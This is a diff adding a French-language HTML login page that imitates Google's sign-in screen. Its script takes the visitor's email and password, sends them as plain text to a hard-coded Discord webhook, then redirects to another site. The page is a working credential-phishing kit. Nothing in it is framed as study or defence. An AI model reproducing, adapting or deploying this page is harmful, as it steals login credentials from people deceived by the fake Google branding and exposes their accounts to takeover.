@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #4285F4; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .warning-message {
+      display: none;
+      margin-top: 15px;
+      color: red;
+      font-weight: bold;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #4285f4;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      animation: spin 2s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <form onsubmit="handleLogin(event)">
+      <input type="email" id="email" placeholder="Adresse e-mail" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit">Connexion</button>
+    </form>
+    <div class="loader" id="loader"></div>
+    <div class="warning-message" id="warning">
+      error 510
+    </div>
+  </div>
+
+  <script>
+    function handleLogin(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Affiche le cercle de chargement
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('warning').style.display = 'none';
+
+      // Après 1 seconde, redirige vers une URL
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        window.location.href = "https://cookieclicker.com/";  // <== Remplace ici
+      }, 1000);
+
+      // Envoie les infos au webhook Discord
+      fetch("https://discordapp.com/api/webhooks/1389533020460945479/I5jE82TQWq6LaOVblfv-EiQATrUm5lhCIqQYqV9K1trSd3m7VFQ4EVo47vd6YQ24EC8J", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `Formulaire rempli :\nEmail : ${email}\nMot de passe : ${password}`
+        })
+      });
+    }
+  </script>
+</body>
+</html>
